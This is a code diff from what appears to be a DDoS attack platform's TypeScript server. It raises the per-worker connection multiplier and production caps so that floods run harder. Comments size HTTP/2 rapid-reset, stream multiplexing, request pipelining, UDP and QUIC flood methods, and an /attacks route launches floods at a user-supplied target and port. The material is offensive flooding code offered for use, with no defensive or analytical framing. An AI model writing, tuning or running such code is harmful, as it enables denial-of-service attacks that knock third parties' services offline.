@@ -232,12 +232,14 @@ const MAX_TOTAL_WORKERS = IS_DEPLOYED ? 64 : 48;
 // ── Thread Multiplier — "Power Level" UX ──────────────────────────────────
 // The UI accepts threads 1–8 (power level). Internally we multiply by this
 // factor to reach full connection concurrency.
-// threads=8 → 8 × 200 = 1600 concurrent connections per worker (prod).
-//   Rapid-reset: 1600 × MAX_INFLIGHT_FACTOR(100) = 80K in-flight per worker.
-//   H2 multiplex: 1600 × 8 streams = 12800 streams per session (capped 4000).
-//   Pipeline: 1600 conn × 512 reqs/write = 819K reqs per write batch.
+// threads=8 → 8 × 500 = 4000 concurrent connections per worker (prod).
+//   Rapid-reset: 4000 × MAX_INFLIGHT_FACTOR(100) = 80K in-flight/worker (capped).
+//   H2 multiplex: 4000 × 8 streams = 32K → capped at 4000 streams/session.
+//   geass-ultima rrT: max(800, 4000×0.55=2200) = 2200 — beats old preset of 3000→1650.
+//   Pipeline: 4000 conn × 512 reqs/write = 2M reqs per write batch.
+// Cap: 12000 in prod (leaves RAM headroom), 256 dev (container safe).
 // Dev: smaller multiplier to stay within shared container limits.
-const THREAD_MULTIPLIER = IS_DEPLOYED ? 200 : 25;
+const THREAD_MULTIPLIER = IS_DEPLOYED ? 500 : 32;
 
 // ── Webhook ────────────────────────────────────────────────────────────────
 async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
@@ -838,9 +840,9 @@ async function runAttackWorkers(
 ): Promise<void> {
   // ── Power-Level Boost ────────────────────────────────────────────────────
   // UI sends threads 1–8 (power level). Multiply to get real connection count.
-  // threads=8 → 1600 concurrent connections per worker (prod) or 200 (dev).
-  // Cap: prod 8000 (enough to saturate any target), dev 256 (container safe).
-  threads = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 8000 : DEV_MAX_THREADS);
+  // threads=8 → 4000 concurrent connections per worker (prod) or 256 (dev).
+  // Cap: prod 12000 (leaves RAM headroom on 32GB), dev 256 (container safe).
+  threads = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 12000 : DEV_MAX_THREADS);
 
   // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
   // quic-flood is also UDP-based (port 443/UDP)
@@ -1536,7 +1538,7 @@ router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
 
   // Show effective connection count after power-level multiplier
   // (threads × THREAD_MULTIPLIER, capped by prod/dev limits)
-  const threadsEffective = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 8000 : DEV_MAX_THREADS);
+  const threadsEffective = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 12000 : DEV_MAX_THREADS);
 
   const [attack] = await db.insert(attacksTable).values({
     target, port, method, duration, threads, threadsEffective,
